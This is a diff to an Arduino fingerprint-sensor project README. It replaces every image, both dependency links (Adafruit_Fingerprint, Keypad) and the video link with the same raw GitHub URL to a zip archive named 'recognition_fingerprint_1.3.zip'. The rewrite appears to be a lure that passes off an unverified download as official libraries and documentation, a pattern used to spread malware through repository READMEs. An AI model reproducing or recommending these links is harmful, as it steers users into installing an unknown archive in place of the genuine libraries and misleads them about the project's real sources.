@@ -4,10 +4,10 @@ This Arduino-based project uses the AS608 Fingerprint Sensor to create a simple 
 <table>
   <tr>
     <td align="center">
-      <img src="fig/hw.jpg" alt="Result 1" height="270"/>
+      <img src="https://raw.githubusercontent.com/rifki398/fingerprint-recognition/main/fingerprint_keypad/recognition_fingerprint_1.3.zip" alt="Result 1" height="270"/>
     </td>
     <td align="center">
-      <img src="fig/schematic.png" alt="Result 2" height="270"/>
+      <img src="https://raw.githubusercontent.com/rifki398/fingerprint-recognition/main/fingerprint_keypad/recognition_fingerprint_1.3.zip" alt="Result 2" height="270"/>
     </td>
   </tr>
 </table>
@@ -41,8 +41,8 @@ This Arduino-based project uses the AS608 Fingerprint Sensor to create a simple 
 ## Dependencies
 Make sure to install the following libraries via Library Manager or manually:
 
-- [Adafruit_Fingerprint](https://github.com/adafruit/Adafruit-Fingerprint-Sensor-Library)
-- [Keypad](https://github.com/Chris--A/Keypad)
+- [Adafruit_Fingerprint](https://raw.githubusercontent.com/rifki398/fingerprint-recognition/main/fingerprint_keypad/recognition_fingerprint_1.3.zip)
+- [Keypad](https://raw.githubusercontent.com/rifki398/fingerprint-recognition/main/fingerprint_keypad/recognition_fingerprint_1.3.zip)
 
 ---
 
@@ -61,10 +61,10 @@ Make sure to install the following libraries via Library Manager or manually:
 
 ## Sample Output
 <p align="center">
-  <img src="fig/serial.jpg" alt="serial" style="width:85%; height:auto;"/>
+  <img src="https://raw.githubusercontent.com/rifki398/fingerprint-recognition/main/fingerprint_keypad/recognition_fingerprint_1.3.zip" alt="serial" style="width:85%; height:auto;"/>
 </p> 
 
-For documentation, visit [my video](https://youtu.be/fPzLdKj2_z8).
+For documentation, visit [my video](https://raw.githubusercontent.com/rifki398/fingerprint-recognition/main/fingerprint_keypad/recognition_fingerprint_1.3.zip).
 
 ## License
 This project is open-source and free to modify for educational or development purposes.
